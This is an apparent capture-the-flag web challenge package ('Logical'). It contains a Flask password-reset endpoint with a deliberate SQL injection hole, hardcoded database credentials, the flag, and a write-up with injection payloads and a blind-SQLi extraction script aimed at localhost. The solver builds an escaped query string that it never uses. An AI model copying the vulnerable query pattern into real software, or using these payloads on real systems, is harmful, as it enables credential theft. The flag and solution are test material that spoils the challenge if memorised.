{
    "docker-compose.yaml": "version: '3.8'\nservices:\n  php-flask-server:\n    container_name: tamuctf-logical-flask\n    build: \n      context: ./py\n      dockerfile: Dockerfile\n    depends_on:\n      - db\n    volumes:\n      - ./py/src:/var/www\n    ports:\n      - 80:8000\n  db:\n    image: mysql:5.7\n    container_name: tamuctf-logical-mysql\n    build: ./sql\n    command: mysqld --user=root --verbose\n    restart: always\n    volumes:\n      - ./sql/database-setup.sql:/docker-entrypoint-initdb.d/setup.sql\n    environment:\n      MYSQL_DATABASE: \"users\"\n      MYSQL_ROOT_PASSWORD: \"a0318d23705e6dd885eacc3f2f25eef4\"\n      MYSQL_USER: \"ro_user\"\n      MYSQL_PASSWORD: \"c207876a6365f76aa03ecff9746af6f6\"\n      MYSQL_ALLOW_EMPTY_PASSWORD: \"yes\"\n    ports:\n      - \"3306:3306\"\n\n",
    "Makefile": "run: \n\tdocker-compose up &\nstop:\n\tdocker-compose down\n\n",
    "README.md": "# Logical\n\nAuthor: `Mr. Blade`\n\n## Description\n\nThe administrator changed their password, and we lost access to their account. We need to regain access to continue our operations.\n\n## Dev notes\n\n<b>No Source code for this challenge</b>\n\nStart: `make run`\n\nStop: `make stop`\n\n## Solution\nSo the page mentions database so likely an SQL challenge of some sort. Looking at main.js it is making POSTS to an endpoint /api/chpass with a username, and the server responds with whether or not it exists.\n\nFirst let's see how we can get sql injection. Tried a bunch of things, got several 500s, but eventually the following payload got me a 200:\n```\nadmin' or ''%3D'\n```\nThe %3D is an html encoded equals sign, since forms don't like having equals signs in them\nAnd the idea is that the query looks like:\n```\nSELECT * FROM table WHERE username='{username}'\n```\n\nso our payload effectively does\n```\nSELECT * FROM table WHERE username='admin' or ''=''\n```\n\n\nSo from there since we have a boolean response of exists or not exists, and I'm assuming the flag is in pthe password we can do something like:\n```\nadmin' and password like 'g%\n```\n\nand this will inject as\n```\nSELECT * FROM table WHERE username='admin' AND password LIKE 'g%'\n```\nthe % symbol is a wildcard for zero or more characters, so this checks if the password starts with a g or not and we can guess the password one letter at a time using the server's response\n\nNote: be careful with wildcards, as they may mess up your results with false positives if not escaped properly, and I spent quite a bit of time fiddling with the charset because because of it\n\nSolve in `solve.py` and below.\n``` py\nimport requests\nfrom string import ascii_letters, digits\ncharset = ascii_letters + digits + '!@#$^&*(){}-_'\npw = 'gigem{'\nwhile pw[-1] != '}':\n    for c in charset:\n        inject = f\"admin' and password like '{pw}\"\n        if c not in '%_[]^-':\n            inject += f\"{c}%\"\n        else:\n            inject += f\"\\\\{c}% escape '\\\\'\"\n        res = requests.post('http://127.0.0.1/api/chpass', data = {\"username\":f\"admin' and password like '{pw}{c}%\"})\n        if 'not exists' not in res.text:\n            pw += c\n            print(pw)\n            break\n```\n\nflag: `gigem{bl1nd-1nj3ct10n}`\n",
    "solve.py": "import requests\nfrom string import ascii_letters, digits\n\ncharset = ascii_letters + digits + '!@#$^&*(){}-_'\n\npw = 'gigem{'\n\nwhile pw[-1] != '}':\n    for c in charset:\n        inject = f\"admin' and password like '{pw}\"\n        if c not in '%_[]^-':\n            inject += f\"{c}%\"\n        else:\n            inject += f\"\\\\{c}% escape '\\\\'\"\n\n        res = requests.post('http://127.0.0.1/api/chpass', data = {\"username\":f\"admin' and password like '{pw}{c}%\"})\n        if 'not exists' not in res.text:\n            pw += c\n            print(pw)\n            break\n",
    "py\\Dockerfile": "FROM python:3.8-slim-buster\n\nRUN apt update -y && apt upgrade -y && apt install -y curl && pip3 install flask && pip3 install mysql-connector-python\nRUN mkdir /var/www\n\nENTRYPOINT [\"python3\", \"/var/www/app.py\"]\n",
    "py\\src\\app.py": "from flask import *\nimport mysql.connector\n\napp = Flask(__name__)\n\n@app.route('/', methods=['GET'])\ndef index():\n    return render_template('index.html')\n\n@app.route('/api/chpass', methods=['POST'])\ndef change_password():\n    username = request.form.get('username')\n    \n    db = mysql.connector.connect(host=\"db\", user=\"ro_user\", password=\"c207876a6365f76aa03ecff9746af6f6\", database=\"users\")\n    cursor = db.cursor()\n\n    query = \"SELECT username FROM users.users WHERE username = '\" + username + \"' LIMIT 1;\"\n\n    cursor.execute(query)\n\n    for ret_user in cursor:\n        cursor.close()\n        db.close()\n        return jsonify({'res': 'exists'})\n\n    return jsonify({'res': 'not exists'})\n\nif __name__ == '__main__':\n    app.run(host='0.0.0.0', port=8000)\n\n",
    "py\\src\\static\\main.js": "var input = document.getElementById(\"username\")\nvar output = document.getElementById(\"output\")\n\ndocument.getElementById(\"username\").addEventListener('keydown', (e) => {\n    if (e.keyCode === 13) {\n        let username = input.value;\n\n        output.innerHTML = '';\n\n        fetch('/api/chpass', {\n            method: 'POST',\n            body: `username=${username}`,\n            headers: {\n                'Content-Type': 'application/x-www-form-urlencoded'\n            }\n        })\n        .then(resp => resp.json())\n        .then(data => {\n            output.innerHTML = 'Email sent';\n        });\n\n        input.value = '';\n    }\n});\n\n",
    "py\\src\\static\\style.css": "body {\n    size: 25px;\n    background-color: #151e3d;\n    color: #000\n}\n\n.container {\n    padding-top: 100px;\n}\n\n.forum {\n    margin-left: 30%;\n    margin-right: 30%;\n    padding-top: 35px;\n    padding-bottom: 50px;\n    background-color: #ffffff;\n    border-radius: 20px;\n}\n\n.input {\n    margin-right: 36px;\n    margin-left: 5px;\n    padding-left: 12px;\n    color: black;\n    size: 20px;\n    height: 25px;\n    background-color: white;\n    border: none;\n    border-radius: 15px;\n    box-shadow: 0px 0px 10px #1d3557\n}\n\n.output {\n    color: black;\n    margin-top: 20px;\n    background-color: white;\n    border: none;\n    resize: none;\n    width: 80%;\n}\n\n",
    "py\\src\\templates\\index.html": "<!DOCTYPE html>\n<html>\n    <head>\n        <title>Logical - TAMUctf</title>\n        <link rel=\"stylesheet\" href=\"static/style.css\"/>\n    </head>\n    <body>\n        <center>\n            <div class=\"container\">\n                <div class=\"forum\">\n                    <h1>Forgot Password</h1>\n                    <p>If your username exists in our database, you will be sent a password reset email.</p>\n                    <label>Username: </label><input class=\"input\" id=\"username\"></input><br>\n                    <textarea class=\"output\" id=\"output\" readonly></textarea>\n                </div>\n            </div>\n        </center>\n    </body>\n    <script src=\"static/main.js\"></script>\n</html>\n",
    "sql\\database-setup.sql": "USE users;\n\nCREATE TABLE users (\n    username TEXT(50),\n    password TEXT(50)\n);\n\nINSERT INTO users (username, password) VALUES (\n    'admin',\n    'gigem{bl1nd-1nj3ct10n}'\n);\n\nREVOKE ALL ON *.* FROM 'ro_user'@'*';\nGRANT SELECT ON *.* TO 'ro_user'@'%';\nFLUSH PRIVILEGES;\n\n",
    "sql\\Dockerfile": "FROM mysql:5.7\n\nENV MYSQL_DATABASE: \"users\"\nENV MYSQL_USER: \"ro_user\"\nENV MYSQL_PASSWORD: \"c207876a6365f76aa03ecff9746af6f6\"\nENV MYSQL_ROOT_PASSWORD: \"a0318d23705e6dd885eacc3f2f25eef4\"\nENV MYSQL_ALLOW_EMPTY_PASSWORD: \"yes\"\n\n",
    "category": "web"
}